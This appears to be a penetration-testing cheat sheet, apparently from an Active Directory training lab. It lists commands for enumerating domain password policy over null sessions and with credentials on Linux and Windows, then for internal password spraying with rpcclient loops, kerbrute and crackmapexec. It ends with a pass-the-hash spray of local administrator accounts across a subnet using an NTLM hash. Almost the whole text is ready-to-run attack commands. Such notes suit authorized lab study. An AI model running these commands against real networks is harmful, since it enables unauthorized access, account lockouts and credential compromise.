# Policy
## Linux
Enumerating password policy in Linux 
```
# With credentials
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Null Session
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
rpcclient $> getdompwinfo

enum4linux -P 172.16.5.5
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## Windows
Finding null session o credentials
```
# Null session
net use \\DC01\ipc$ "" /u:""
# User
net use \\DC01\ipc$ "" /u:guest
# Password
net use \\DC01\ipc$ "password" /u:guest
```

Searching policy
```
# Using net.exe
net accounts
# Using PowerView
import-module .\PowerView.ps1
Get-DomainPolicy
```
# Internal Password Spraying 
## Linux
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Administration Spray
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
